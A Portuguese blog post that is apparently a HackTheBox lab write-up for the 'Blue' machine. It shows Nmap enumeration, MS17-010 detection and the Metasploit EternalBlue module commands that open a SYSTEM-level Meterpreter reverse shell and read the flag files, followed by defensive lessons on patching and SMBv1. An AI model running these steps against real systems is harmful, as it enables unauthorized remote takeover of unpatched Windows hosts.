---
title: "HackTheBox 'Blue' — Explorando o EternalBlue (MS17-010)"
description: "Resolução completa da máquina Blue do HackTheBox: enumeração com Nmap, identificação da CVE-2017-0144 (EternalBlue) e exploração via Metasploit para obter shell SYSTEM."
pubDate: 2026-08-10
category: "Machine Write-ups"
tags: ["HackTheBox", "Windows", "EternalBlue", "Metasploit", "SMB"]
---

## Reconhecimento Inicial

Começamos com uma varredura básica de portas usando o **Nmap** para entender a superfície de ataque da máquina alvo.

```bash
nmap -sC -sV -oA nmap/initial 10.10.10.40
```

O scan revelou rapidamente múltiplas portas abertas, mas o destaque fica para o serviço **SMB** na porta 445:

```text
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds
3389/tcp open  tcpwrapped
```

## Identificação da Vulnerabilidade

O Windows 7 sem atualizações é um forte indício. Vamos rodar o script específico de detecção do MS17-010:

```bash
nmap -p445 --script smb-vuln-ms17-010 10.10.10.40
```

```text
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0144
```

> **Nota do analista:** A CVE-2017-0144 (EternalBlue) permite RCE através do protocolo SMBv1. É uma das vulnerabilidades mais exploradas da história e constantemente aparece em ambientes corporativos desatualizados durante pentests.

## Exploração

Dentro do **Metasploit Framework**, utilizamos o módulo `exploit/windows/smb/ms17_010_eternalblue`:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST tun0
run
```

Após alguns segundos, conseguimos um shell de **SYSTEM**:

```text
[*] Sending stage (200774 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Pós-Exploração e Captura da Flag

Com privilégios de SYSTEM, a leitura das flags é trivial:

```bash
cat C:\Users\Administrator\Desktop\root.txt
cat C:\Users\haris\Desktop\user.txt
```

## Lições Aprendidas

1. **Patch Management é crítico** — MS17-010 foi corrigido em 2017, mas ainda é onipresente.
2. **Desabilitar SMBv1** elimina uma vasta classe de ataques.
3. Em um pentest real, esse tipo de falha justificaria um relatório de severidade **Crítica** com CVSS 8.1+.
